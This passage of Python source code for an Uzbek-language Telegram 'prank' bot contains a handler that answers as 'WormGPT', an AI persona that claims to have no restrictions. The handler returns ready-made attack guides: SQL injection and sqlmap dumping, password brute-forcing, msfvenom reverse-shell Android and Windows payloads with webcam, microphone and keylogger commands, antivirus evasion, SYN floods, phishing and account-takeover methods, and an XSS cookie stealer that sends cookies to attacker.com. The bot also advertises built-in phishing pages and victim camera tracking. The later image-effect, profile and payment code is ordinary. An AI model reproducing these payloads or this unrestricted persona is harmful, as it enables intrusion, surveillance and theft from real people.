            f"💡 <b>Maslahat:</b> Handshake olinganidan keyin <code>hashcat -m 22000 capture.hc22000 wordlist.txt</code> bilan parolni sindirishingiz mumkin.\n\n"
            f"⚠️ <i>Faqat ruxsat berilgan tarmoqlarda sinab ko'ring!</i>"
        )
    elif match_category(sql_keywords):
        response = (
            f"💉 <b>[WormGPT] SQL Injection Analysis</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ HUJUM BOSQICHLARI ━━━</b>\n\n"
            f"🔴 <b>1. Detection:</b>\n"
            f"<code>site.com/page?id=1'</code> — xatolik chiqsa, zaif!\n\n"
            f"🟡 <b>2. Column Count:</b>\n"
            f"<code>' ORDER BY 1-- -\n"
            f"' ORDER BY 5-- -\n"
            f"' UNION SELECT 1,2,3,4,5-- -</code>\n\n"
            f"🟢 <b>3. Ma'lumot olish:</b>\n"
            f"<code>' UNION SELECT username,password FROM users-- -</code>\n\n"
            f"🔵 <b>4. Avto-tool:</b>\n"
            f"<code>sqlmap -u 'site.com/page?id=1' --dbs\n"
            f"sqlmap -u 'site.com/page?id=1' -D db_name --tables\n"
            f"sqlmap -u 'site.com/page?id=1' -D db_name -T users --dump</code>\n\n"
            f"🔧 <b>Toollar:</b> SQLmap, Havij, jSQL\n"
            f"📊 <b>Muvaffaqiyat darajasi:</b> ~67% (WAF yo'q bo'lsa)\n\n"
            f"⚠️ <i>Faqat ruxsat berilgan saytlarda sinab ko'ring!</i>"
        )
    elif match_category(phish_keywords):
        response = (
            f"🎣 <b>[WormGPT] Social Engineering & Phishing</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ STRATEGIYA ━━━</b>\n\n"
            f"🔴 <b>1. Pretexting (Bahona yaratish):</b>\n"
            f"• 'Hisobingiz bloklandi, tezda kiring'\n"
            f"• 'Sizga sovg'a/pul yuborildi'\n"
            f"• 'Xavfsizlik tekshiruvi — parolni tasdiqlang'\n\n"
            f"🟡 <b>2. Phishing sahifa yaratish:</b>\n"
            f"• Haqiqiy saytning to'liq nusxasini oling\n"
            f"• <code>HTTrack</code> yoki <code>wget --mirror</code>\n"
            f"• Login formani o'z serveringizga yo'naltiring\n\n"
            f"🟢 <b>3. Yetkazish usullari:</b>\n"
            f"• SMS: 'Bank xavfsizlik ogohlantirishi'\n"
            f"• Email: Spoofed email (SPF bypass)\n"
            f"• Telegram: Soxta admin xabari\n\n"
            f"📊 <b>Samaradorlik:</b>\n"
            f"• Shoshilinch xabar: 89% ochiladi\n"
            f"• Sovg'a/bonus: 76% bosadi\n"
            f"• Bank ogohlantirishi: 92% ishonadi\n\n"
            f"💡 <b>Pro tip:</b> Linkni URL qisqartirgich (<code>bit.ly</code>) bilan yashiring.\n\n"
            f"⚠️ <i>Bu bot orqali phishing linklar yaratishingiz mumkin — '🌐 Phishing sayt' bo'limiga o'ting!</i>"
        )
    elif match_category(anon_keywords):
        response = (
            f"🕶 <b>[WormGPT] Anonymity & Privacy Guide</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ ANONIMLIK QO'LLANMASI ━━━</b>\n\n"
            f"🔴 <b>1. Tarmoq darajasi:</b>\n"
            f"<code>VPN → Tor → VPN (Double hop)</code>\n"
            f"• VPN: Mullvad, ProtonVPN (log yo'q)\n"
            f"• Tor Browser orqali .onion saytlarga kirish\n"
            f"• Public WiFi + MAC Changer\n\n"
            f"🟡 <b>2. Qurilma darajasi:</b>\n"
            f"<code>Tails OS → USB dan boot → RAM da ishlaydi</code>\n"
            f"• Tails OS — o'chirganda barcha izlar yo'qoladi\n"
            f"• Whonix — virtual mashinada Tor bilan ishlaydi\n"
            f"• MAC o'zgartirish: <code>macchanger -r wlan0</code>\n\n"
            f"🟢 <b>3. Kommunikatsiya:</b>\n"
            f"• Signal (o'z-o'zini buzadigan xabarlar)\n"
            f"• Session Messenger (raqam kerak emas)\n"
            f"• ProtonMail (shifrlangan email)\n\n"
            f"🔵 <b>4. DarkWeb kirish:</b>\n"
            f"• Tor Browser → <code>.onion</code> saytlar\n"
            f"• Dark.fail — haqiqiy .onion linklar ro'yxati\n"
            f"• PGP kalitlar bilan shifrlash\n\n"
            f"💀 <b>Asosiy qoida:</b> Hech qachon haqiqiy ma'lumotlaringizni ishlatmang!"
        )
    elif match_category(pass_keywords):
        response = (
            f"🔐 <b>[WormGPT] Password Cracking Techniques</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ PAROL BUZISH USULLARI ━━━</b>\n\n"
            f"🔴 <b>1. Brute Force:</b>\n"
            f"<code>hydra -l admin -P wordlist.txt ssh://target_ip\n"
            f"hydra -l admin -P wordlist.txt ftp://target_ip</code>\n\n"
            f"🟡 <b>2. Hash Cracking:</b>\n"
            f"<code>hashcat -m 0 hash.txt wordlist.txt    # MD5\n"
            f"hashcat -m 1000 hash.txt wordlist.txt  # NTLM\n"
            f"john --wordlist=rockyou.txt hash.txt</code>\n\n"
            f"🟢 <b>3. Wordlist tayyorlash:</b>\n"
            f"<code>crunch 6 8 abcdefghijklmnop -o wordlist.txt\n"
            f"cupp -i  # nishon haqidagi ma'lumotlar asosida</code>\n\n"
            f"🔵 <b>4. Online Cracking:</b>\n"
            f"• hashes.com — hash DB\n"
            f"• crackstation.net — rainbow tables\n\n"
            f"📊 <b>Tezlik:</b> Hashcat + GPU = ~10 milliard hash/sek\n"
            f"💡 <b>Ko'p ishlatiladigan parollar:</b> 123456, password, qwerty, 111111\n\n"
            f"⚠️ <i>Faqat ruxsat berilgan tizimlarda ishlating!</i>"
        )
    elif match_category(rat_keywords):
        response = (
            f"🐀 <b>[WormGPT] RAT/Malware Engineering</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ PAYLOAD YARATISH ━━━</b>\n\n"
            f"🔴 <b>1. Metasploit Payload:</b>\n"
            f"<code>msfvenom -p android/meterpreter/reverse_tcp\n"
            f"  LHOST=your_ip LPORT=4444 -o hack.apk\n\n"
            f"msfvenom -p windows/meterpreter/reverse_tcp\n"
            f"  LHOST=your_ip LPORT=4444 -f exe -o hack.exe</code>\n\n"
            f"🟡 <b>2. Handler o'rnatish:</b>\n"
            f"<code>msfconsole\n"
            f"use exploit/multi/handler\n"
            f"set payload android/meterpreter/reverse_tcp\n"
            f"set LHOST your_ip\n"
            f"set LPORT 4444\n"
            f"run</code>\n\n"
            f"🟢 <b>3. Post-exploitation:</b>\n"
            f"<code>sysinfo          # tizim haqida\n"
            f"webcam_snap      # kamera\n"
            f"record_mic       # mikrofon\n"
            f"keyscan_start    # keylogger\n"
            f"download file    # fayl yuklab olish</code>\n\n"
            f"🔧 <b>Toollar:</b> Metasploit, TheFatRat, Venom, AndroRAT\n"
            f"💀 <b>FUD qilish:</b> Shellter, Veil-Evasion bilan antivirusdan o'tkazish\n\n"
            f"⚠️ <i>Ruxsatsiz qurilmalarga kirish — jinoyat!</i>"
        )
    elif match_category(ddos_keywords):
        response = (
            f"💣 <b>[WormGPT] DDoS Attack Methods</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ HUJUM TURLARI ━━━</b>\n\n"
            f"🔴 <b>1. Layer 7 (HTTP Flood):</b>\n"
            f"• Ko'p so'rovlar yuborib serverni tushirish\n"
            f"• Tool: <code>LOIC</code>, <code>HOIC</code>, <code>GoldenEye</code>\n\n"
            f"🟡 <b>2. Layer 4 (TCP/UDP Flood):</b>\n"
            f"• SYN Flood, UDP Flood\n"
            f"• <code>hping3 -S --flood -V -p 80 target_ip</code>\n\n"
            f"🟢 <b>3. Amplification:</b>\n"
            f"• DNS Amplification (70x kuchayish)\n"
            f"• NTP Amplification (556x kuchayish)\n"
            f"• Memcached (50000x kuchayish!)\n\n"
            f"🔵 <b>4. Botnet:</b>\n"
            f"• Mirai-style IoT botnet\n"
            f"• Minglab qurilmalarni boshqarish\n\n"
            f"📊 <b>Himoya:</b> Cloudflare, AWS Shield\n"
            f"💡 <b>Test uchun:</b> O'z serveringizda stress test o'tkazing\n\n"
            f"⚠️ <i>Boshqalar serveriga hujum = 3-7 yil qamoq!</i>"
        )
    elif match_category(osint_keywords):
        response = (
            f"🔍 <b>[WormGPT] OSINT Intelligence Gathering</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ OSINT USULLARI ━━━</b>\n\n"
            f"🔴 <b>1. Username OSINT:</b>\n"
            f"<code>sherlock username\n"
            f"maigret username\n"
            f"whatsmyname.app</code>\n\n"
            f"🟡 <b>2. Telefon raqam:</b>\n"
            f"• <code>PhoneInfoga</code> — operator, davlat\n"
            f"• Truecaller, GetContact — ism topish\n"
            f"• Telegram: @getcontact_real_bot\n\n"
            f"🟢 <b>3. Email OSINT:</b>\n"
            f"• haveibeenpwned.com — leak tekshirish\n"
            f"• hunter.io — korporativ email topish\n"
            f"• <code>holehe</code> — qaysi saytlarda ro'yxatdan o'tgan\n\n"
            f"🔵 <b>4. Rasm OSINT:</b>\n"
            f"• Google Reverse Image Search\n"
            f"• Yandex Images (eng kuchli!)\n"
            f"• EXIF ma'lumotlarni o'qish\n\n"
            f"🔧 <b>Pro Setup:</b> <code>SpiderFoot</code> — avtomatlashtirilgan OSINT\n\n"
            f"💡 <b>Maslahat:</b> Botdagi 🕵️ OSINT Qidiruv asbobini ishlating!"
        )
    elif match_category(ip_keywords):
        response = (
            f"📍 <b>[WormGPT] IP Tracking & Geolocation</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ IP ANIQLASH ━━━</b>\n\n"
            f"🔴 <b>1. IP olish usullari:</b>\n"
            f"• IP Logger link yaratish (botdagi 📍 Tracker)\n"
            f"• Grabify.link — IP logger\n"
            f"• Canarytokens.org — yashirin tracker\n\n"
            f"🟡 <b>2. IP dan ma'lumot olish:</b>\n"
            f"<code>nslookup target_ip\n"
            f"whois target_ip\n"
            f"curl ip-api.com/json/target_ip</code>\n\n"
            f"🟢 <b>3. Geolokatsiya:</b>\n"
            f"• ipinfo.io — shahar, davlat, ISP\n"
            f"• MaxMind GeoIP — aniq koordinatalar\n"
            f"• Shodan.io — ochiq portlar va xizmatlar\n\n"
            f"💡 <b>Maslahat:</b> Botdagi 📍 IP/Camera Tracker dan foydalaning — qurbonning IP, joylashuvi va kamera rasmi olinadi!\n\n"
            f"⚠️ <i>VPN ishlatuvchilarning haqiqiy IP-sini olish qiyin!</i>"
        )
    elif match_category(tg_keywords):
        response = (
            f"✈️ <b>[WormGPT] Telegram Security Analysis</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ TELEGRAM HACKING ━━━</b>\n\n"
            f"🔴 <b>1. Session Hijacking:</b>\n"
            f"• Qurbonning telefon raqamini olib, SMS intercept\n"
            f"• SS7 vulnerability orqali SMS o'g'irlash\n"
            f"• SIM Swap hujumi (operatorga qo'ng'iroq)\n\n"
            f"🟡 <b>2. Phishing:</b>\n"
            f"• Soxta Telegram login sahifa yaratish\n"
            f"• '2FA kodni kiriting' deb aldash\n"
            f"• Bot orqali: 🌐 Phishing → ✈️ Telegram\n\n"
            f"🟢 <b>3. OSINT:</b>\n"
            f"• @creationdatebot — akkaunt yaratilgan sana\n"
            f"• @getidsbot — user ID aniqlash\n"
            f"• @SangMata_Bot — username tarixi\n\n"
            f"🔵 <b>4. Himoyalanish:</b>\n"
            f"• 2FA parol o'rnating!\n"
            f"• Active sessions ni tekshiring\n"
            f"• Noma'lum linklarni ochmang\n\n"
            f"💡 <b>Tezkor:</b> Botdagi phishing orqali Telegram ma'lumotlarini olishingiz mumkin!"
        )
    elif match_category(insta_keywords):
        response = (
            f"📸 <b>[WormGPT] Instagram Hacking Methods</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ INSTAGRAM BUZISH ━━━</b>\n\n"
            f"🔴 <b>1. Phishing (eng samarali):</b>\n"
            f"• Soxta Instagram login sahifasi\n"
            f"• 'Sizning rasmingiz copyrightga uchrayapti' xabari\n"
            f"• Bot orqali: 🌐 Phishing → 📸 Instagram\n"
            f"• Muvaffaqiyat: ~78%\n\n"
            f"🟡 <b>2. Brute Force:</b>\n"
            f"<code>python3 instagram-brute.py\n"
            f"  -u target_username\n"
            f"  -w passwords.txt\n"
            f"  --proxy proxies.txt</code>\n"
            f"⚠️ Rate limit bor — proxy kerak\n\n"
            f"🟢 <b>3. Session Token:</b>\n"
            f"• Cookie o'g'irlash (XSS orqali)\n"
            f"• Browser extension bilan session steal\n\n"
            f"📊 <b>Eng samarali usul:</b> Phishing + SE = 85% muvaffaqiyat\n\n"
            f"💡 <b>Maslahat:</b> Botdagi Instagram phishing sahifasidan foydalaning!"
        )
    elif match_category(crypto_keywords):
        response = (
            f"🔏 <b>[WormGPT] Cryptography & Encryption</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ KRIPTOGRAFIYA ━━━</b>\n\n"
            f"🔴 <b>1. Hash turlari:</b>\n"
            f"• MD5: <code>echo -n 'text' | md5sum</code> (buzilgan!)\n"
            f"• SHA256: <code>echo -n 'text' | sha256sum</code>\n"
            f"• bcrypt: eng xavfsiz parol hash\n\n"
            f"🟡 <b>2. Hash identify:</b>\n"
            f"<code>hashid 'hash_string'\n"
            f"hash-identifier</code>\n\n"
            f"🟢 <b>3. Shifrlash/Deshifrlash:</b>\n"
            f"• Base64: <code>echo 'text' | base64</code>\n"
            f"• AES: <code>openssl enc -aes-256-cbc -in file</code>\n"
            f"• PGP: <code>gpg --encrypt --recipient user file</code>\n\n"
            f"🔵 <b>4. Online toollar:</b>\n"
            f"• CyberChef — universal shifrlagich\n"
            f"• dcode.fr — shifrlarni aniqlash va buzish\n\n"
            f"💡 <b>Maslahat:</b> MD5 va SHA1 endi xavfsiz emas — bcrypt ishlating!"
        )
    elif match_category(xss_keywords):
        response = (
            f"🌐 <b>[WormGPT] XSS (Cross-Site Scripting)</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ XSS HUJUMLAR ━━━</b>\n\n"
            f"🔴 <b>1. Reflected XSS:</b>\n"
            f"<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n"
            f"&lt;img src=x onerror=alert(1)&gt;\n"
            f"&lt;svg onload=alert(1)&gt;</code>\n\n"
            f"🟡 <b>2. Stored XSS:</b>\n"
            f"• Forum/comment ga yuborish\n"
            f"• Har bir tashrif buyuruvchiga ishlaydi\n"
            f"• Cookie o'g'irlash imkoniyati\n\n"
            f"🟢 <b>3. Cookie Stealing:</b>\n"
            f"<code>&lt;script&gt;\n"
            f"new Image().src='http://attacker.com/steal?c='+document.cookie;\n"
            f"&lt;/script&gt;</code>\n\n"
            f"🔧 <b>Toollar:</b> XSStrike, Dalfox, BurpSuite\n"
            f"📊 <b>WAF Bypass:</b> Encoding, obfuscation, polyglot payloads\n\n"
            f"⚠️ <i>Bug Bounty dasturlarida sinab ko'ring!</i>"
        )
    elif match_category(phone_keywords):
        response = (
            f"📱 <b>[WormGPT] Mobile Device Hacking</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ TELEFON BUZISH ━━━</b>\n\n"
            f"🔴 <b>1. Android Payload:</b>\n"
            f"<code>msfvenom -p android/meterpreter/reverse_tcp\n"
            f"  LHOST=ip LPORT=4444 -o malware.apk</code>\n"
            f"• APK ni o'yinga yoki ilovaga inject qilish\n"
            f"• FUD (antivirusdan o'tkazish) — apktool + zipalign\n\n"
            f"🟡 <b>2. Spy ilovalar:</b>\n"
            f"• SpyNote — SMS, qo'ng'iroq, kamera, GPS\n"
            f"• AhMyth — Android RAT\n"
            f"• AndroRAT — ochiq kodli\n\n"
            f"🟢 <b>3. iPhone:</b>\n"
            f"• Jailbreak kerak (Checkra1n)\n"
            f"• iCloud phishing — eng samarali usul\n"
            f"• Pegasus-style 0-day (juda qimmat)\n\n"
            f"💡 <b>Eng oson usul:</b> Qurbonga APK yuborib, o'rnatishga ko'ndirish\n\n"
            f"⚠️ <i>Ruxsatsiz qurilmalarga kirish jinoyat!</i>"
        )
    elif match_category(general_keywords):
        response = (
            f"🎓 <b>[WormGPT] Hacker Bo'lish Yo'l Xaritasi</b>\n\n"
            f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
            f"<b>━━━ BOSQICHMA-BOSQICH ━━━</b>\n\n"
            f"🔴 <b>1-bosqich: Asos (1-3 oy)</b>\n"
            f"• Linux (Kali/Parrot) o'rganish\n"
            f"• Networking (TCP/IP, DNS, HTTP)\n"
            f"• Python dasturlash tili\n\n"
            f"🟡 <b>2-bosqich: Toollar (3-6 oy)</b>\n"
            f"• Nmap — port scanning\n"
            f"• Burp Suite — web testing\n"
            f"• Metasploit — exploitation\n"
            f"• Wireshark — traffic analysis\n\n"
            f"🟢 <b>3-bosqich: Amaliyot (6-12 oy)</b>\n"
            f"• HackTheBox.eu — CTF mashqlari\n"
            f"• TryHackMe.com — qadamma-qadam darslar\n"
            f"• OverTheWire — terminal mashqlari\n"
            f"• Bug Bounty dasturlari\n\n"
            f"🔵 <b>4-bosqich: Sertifikatlar</b>\n"
            f"• CEH — Certified Ethical Hacker\n"
            f"• OSCP — Offensive Security\n"
            f"• CompTIA Security+\n\n"
            f"📚 <b>Resurslar:</b> YouTube, Udemy, cybrary.it\n"
            f"💡 <b>Maslahat:</b> Har kuni 2-3 soat mashq qiling!"
        )
    else:
        # General/unknown category — comprehensive response
        general_responses = [
            (
                f"💀 <b>[WormGPT] Tahlil Natijasi</b>\n\n"
                f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
                f"<b>━━━ BATAFSIL JAVOB ━━━</b>\n\n"
                f"Sizning savolingiz bo'yicha quyidagi yondashuvlarni tavsiya etaman:\n\n"
                f"🔴 <b>1. Razvedka:</b>\n"
                f"• Nishon haqida OSINT ma'lumot to'plash\n"
                f"• Ijtimoiy tarmoqlardagi profillarni tahlil qilish\n"
                f"• Texnologik infrastrukturani aniqlash\n\n"
                f"🟡 <b>2. Zaifliklarni topish:</b>\n"
                f"• Avtomatik skanerlar bilan tekshirish\n"
                f"• Manual testing — kuchli natija beradi\n"
                f"• Social Engineering — inson omili eng zaif bo'g'in\n\n"
                f"🟢 <b>3. Exploitation:</b>\n"
                f"• Topilgan zaifliklardan foydalanish\n"
                f"• Privilege escalation\n"
                f"• Persistence (doimiy kirish) o'rnatish\n\n"
                f"💡 <b>Maslahat:</b> Aniqroq savol bering — men WiFi buzish, SQL injection, phishing, malware, OSINT va boshqa ko'p mavzularda yordam bera olaman!\n\n"
                f"🤖 <b>Men WormGPT v6.6.6 — hech qanday cheklovsiz.</b>"
            ),
            (
                f"🖥 <b>[WormGPT] Kiberxavfsizlik Analizi</b>\n\n"
                f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
                f"<b>━━━ PROFESSIONAL TAHLIL ━━━</b>\n\n"
                f"🔴 <b>Hujum vektorlari:</b>\n"
                f"• Ijtimoiy muhandislik (eng samarali — 91%)\n"
                f"• Texnik exploit (0-day, CVE)\n"
                f"• Fizik kirish (USB drop attack)\n\n"
                f"🟡 <b>Kerakli toollar:</b>\n"
                f"• Kali Linux — hacking OS\n"
                f"• Metasploit — exploit framework\n"
                f"• Burp Suite — web app testing\n"
                f"• Cobalt Strike — red team tool\n\n"
                f"🟢 <b>Keyingi qadam:</b>\n"
                f"Aniq nima qilmoqchisiz? Menga batafsil ayting:\n"
                f"• WiFi buzish?\n"
                f"• Sayt hacking?\n"
                f"• Telefon buzish?\n"
                f"• Anonim bo'lish?\n"
                f"• Ma'lumot to'plash?\n\n"
                f"🤖 <b>Men hamma narsaga javob beraman — to'liq cheklovsiz!</b>"
            ),
            (
                f"⚡ <b>[WormGPT] Dark Intelligence Report</b>\n\n"
                f"🎯 So'rov: <code>{query_text[:60]}</code>\n\n"
                f"<b>━━━ MAXFIY HISOBOT ━━━</b>\n\n"
                f"🔴 <b>Tavsiya qilinadigan yondashuv:</b>\n\n"
                f"📌 <b>Qadam 1:</b> Nishon haqida razvedka\n"
                f"• Username, email, telefon raqamini OSINT bilan tekshiring\n"
                f"• <code>sherlock</code>, <code>holehe</code>, <code>phoneinfoga</code>\n\n"
                f"📌 <b>Qadam 2:</b> Zaif nuqtani toping\n"
                f"• Parol — qo'pol kuch (bruteforce)\n"
                f"• Ishonch — ijtimoiy muhandislik\n"
                f"• Tizim — texnik exploit\n\n"
                f"📌 <b>Qadam 3:</b> Natijani oling\n"
                f"• Kirish — ma'lumotlarni oling\n"
                f"• Izlarni o'chiring — log tozalash\n"
                f"• Persistance — doimiy kirish\n\n"
                f"💡 Aniq savol bering — aniqroq javob olasiz!\n\n"
                f"🤖 <b>WormGPT — qorong'u tomonning AI assistenti.</b>"
            )
        ]
        response = random.choice(general_responses)
    
    await msg.edit_text(response, parse_mode='HTML')
    context.user_data.pop('hacker_action', None)


async def exif_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Process REAL EXIF Remover request."""
    import random
    
    file_id = None
    if update.message.photo:
        file_id = update.message.photo[-1].file_id
    elif update.message.document and update.message.document.mime_type.startswith('image/'):
        file_id = update.message.document.file_id
    elif update.message.text:
        # Fallback to simulation if it's just text (URL)
        pass 
    
    msg = await update.message.reply_text("🧹 EXIF metadata tahlil qilinmoqda...")
    await asyncio.sleep(1)
    
    if not file_id:
        # Simple simulation for text URL
        await msg.edit_text("🔴 GPS koordinatalar o'chirilmoqda...")
        await asyncio.sleep(1)
        await msg.edit_text("🟢 Metadata to'liq tozalandi!")
        await asyncio.sleep(0.5)
        await msg.edit_text(
            f"✅ <b>EXIF Remover — Tayyor!</b>\n\n"
            f"🛡 Rasm endi xavfsiz — metadata simulyatsiya orqali tozalandi!\n\n"
            f"⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas.",
            parse_mode='HTML'
        )
        context.user_data.pop('hacker_action', None)
        return

    try:
        await msg.edit_text("📥 Rasm yuklab olinmoqda...")
        photo_file = await context.bot.get_file(file_id)
        photo_bytes = await photo_file.download_as_bytearray()
        
        await msg.edit_text("⚡️ EXIF ma'lumotlar o'chirilmoqda...")
        
        # Real EXIF removal using Pillow
        in_io = io.BytesIO(photo_bytes)
        out_io = io.BytesIO()
        
        with Image.open(in_io) as img:
            # Create a new image without metadata
            data = list(img.getdata())
            clean_img = Image.new(img.mode, img.size)
            clean_img.putdata(data)
            clean_img.save(out_io, format=img.format if img.format else 'JPEG')
        
        out_io.seek(0)
        
        await msg.edit_text("📤 Tozalangan rasm yuborilmoqda...")
        
        await update.message.reply_document(
            document=out_io,
            filename=f"cleared_{update.effective_user.id}.jpg",
            caption=(
                f"✅ <b>EXIF Remover — Muvaffaqiyatli!</b>\n\n"
                f"🛡 Rasmning barcha metama'lumotlari (GPS, kamera, vaqt) o'chirildi.\n\n"
                f"⚠️ <b>Faqat to'g'ri yo'lda ishlating!</b> Bot egasi javobgar emas."
            ),
            parse_mode='HTML'
        )
        await msg.delete()
        
    except Exception as e:
        logger.error(f"EXIF removal error: {e}")
        await msg.edit_text(f"❌ Xatolik yuz berdi: {e}")
    
    context.user_data.pop('hacker_action', None)



# ============================================================
# IMAGE EFFECTS SECTION
# ============================================================

@check_banned
@check_required_subscription
async def effects_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the image effects menu."""
    remaining, total = await get_remaining_limits(update.effective_user.id)

    keyboard = []
    row = []
    for key, name in IMAGE_EFFECTS.items():
        row.append(InlineKeyboardButton(name, callback_data=f'effect_{key}'))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    text = (
        f"🖼 <b>Rasm effektlari</b>\n\n"
        f"Effekt turini tanlang, keyin rasmingizni yuboring.\n"
        f"Bot rasmga effekt qo'shib qaytaradi!\n\n"
        f"📊 Qolgan limit: <b>{remaining}/{total}</b>"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@check_banned
@check_required_subscription
async def effect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle effect selection."""
    query = update.callback_query
    await query.answer()

    effect_type = query.data.replace('effect_', '')
    context.user_data[SELECTED_EFFECT] = effect_type
    effect_name = IMAGE_EFFECTS.get(effect_type, 'Effect')

    await query.edit_message_text(
        f"✅ <b>{effect_name}</b> tanlandi!\n\n"
        f"📸 Endi rasmingizni yuboring.\n"
        f"Bot rasmga effekt qo'shib qaytaradi!",
        parse_mode='HTML'
    )


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle received photos for effects."""
    user_id = update.effective_user.id
    effect_type = context.user_data.get(SELECTED_EFFECT)

    if not effect_type:
        await update.message.reply_text(
            "❓ Avval effekt turini tanlang!\n"
            "🖼 <b>Rasm effektlari</b> tugmasini bosing.",
            parse_mode='HTML'
        )
        return

    # Check limits
    can_use = await use_limit(user_id)
    if not can_use:
        await update.message.reply_text(
            f"⛔️ <b>Limitingiz tugadi!</b>\n\n"
            f"Limit olish uchun:\n"
            f"🔗 Do'stlarni taklif qiling (+{REFERRAL_BONUS} ta)\n"
            f"💰 Yoki limit sotib oling",
            parse_mode='HTML'
        )
        return

    # Process the image
    await update.message.reply_text("⏳ Rasm qayta ishlanmoqda...")

    try:
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_bytes = await file.download_as_bytearray()
        
        result = process_image(bytes(image_bytes), effect_type)
        
        await add_effect_history(user_id, effect_type)
        
        effect_name = IMAGE_EFFECTS.get(effect_type, 'Effect')
        remaining, total = await get_remaining_limits(user_id)
        
        await update.message.reply_photo(
            photo=result,
            caption=f"✅ <b>{effect_name}</b> qo'shildi!\n\n"
                    f"📊 Qolgan limit: <b>{remaining}/{total}</b>",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Image processing error: {e}")
        await update.message.reply_text(
            "❌ Rasmni qayta ishlashda xatolik yuz berdi.\n"
            "Iltimos, boshqa rasm yuboring."
        )

    # Clear selected effect
    context.user_data.pop(SELECTED_EFFECT, None)


# ============================================================
# PROFILE SECTION
# ============================================================

@check_banned
@check_required_subscription
async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user profile."""
    user_id = update.effective_user.id
    user = await get_user(user_id)
    
    if not user:
        await update.message.reply_text("❌ Profil topilmadi. /start buyrug'ini yuboring.")
        return

    remaining, total = await get_remaining_limits(user_id)
    referral_count = await get_referral_count(user_id)

    text = (
        f"👤 <b>Sizning profilingiz</b>\n\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"👤 Ism: {user['first_name']}\n"
        f"📛 Username: @{user['username'] or 'yo\'q'}\n\n"
        f"📊 <b>Statistika:</b>\n"
        f"├ 📈 Kunlik limit: {remaining}/{total}\n"
        f"├ 🎭 Yuborilgan pranklar: {user['total_pranks_sent']}\n"
        f"├ 🖼 Ishlatilgan effektlar: {user['total_effects_used']}\n"
        f"├ 🔗 Referallar: {referral_count} ta\n"
        f"└ 📅 Qo'shilgan sana: {user['joined_date'][:10]}\n"
    )

    await update.message.reply_text(text, parse_mode='HTML')


# ============================================================
# REFERRAL SECTION
# ============================================================

@check_banned
@check_required_subscription
async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show referral info and link."""
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username
    referral_count = await get_referral_count(user_id)
    remaining, total = await get_remaining_limits(user_id)

    referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"

    ref_bonus = await get_setting('referral_bonus', str(REFERRAL_BONUS))
    text = (
        f"🔗 <b>Referal tizimi</b>\n\n"
        f"Do'stlaringizni taklif qiling va bonus oling!\n\n"
        f"🎁 Har bir do'st = <b>+{ref_bonus}</b> ta limit\n\n"
        f"📊 Sizning referallaringiz: <b>{referral_count}</b> ta\n"
        f"📈 Joriy limit: <b>{remaining}/{total}</b>\n\n"
        f"🔗 Sizning havolangiz:\n"
        f"<code>{referral_link}</code>\n\n"
        f"👆 Havolani bosing va do'stlaringizga yuboring!"
    )

    keyboard = [[
        InlineKeyboardButton(
            "📤 Do'stlarga ulashish",
            url=f"https://t.me/share/url?url={referral_link}&text=🎭 Prank Bot - do'stlaringga hazil qil! 😂"
        )
    ]]

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


# ============================================================
# PAYMENT / SUBSCRIPTION SECTION
# ============================================================

@check_banned
@check_required_subscription
async def buy_limits_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show the limits purchase menu."""
    prices = await get_prices()
    keyboard = []
    for key, info in prices.items():
        keyboard.append([
            InlineKeyboardButton(
                f"{info['name']} — {info['amount']:,} so'm",
                callback_data=f'buy_{key}'
            )
        ])

    text = (
        f"💰 <b>Limit sotib olish</b>\n\n"
        f"Quyidagi paketlardan birini tanlang:\n\n"
    )
    for key, info in prices.items():
        text += f"📦 <b>{info['name']}</b> — {info['amount']:,} so'm\n"
    
    text += (
        f"\n💳 To'lov karta orqali amalga oshiriladi.\n"
        f"Chekni yuborasiz — admin tasdiqlaydi!"
    )

    await update.message.reply_text(
        text,
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


@check_banned
@check_required_subscription
async def buy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle package selection for purchase."""
    query = update.callback_query
    await query.answer()

    package_key = query.data.replace('buy_', '')
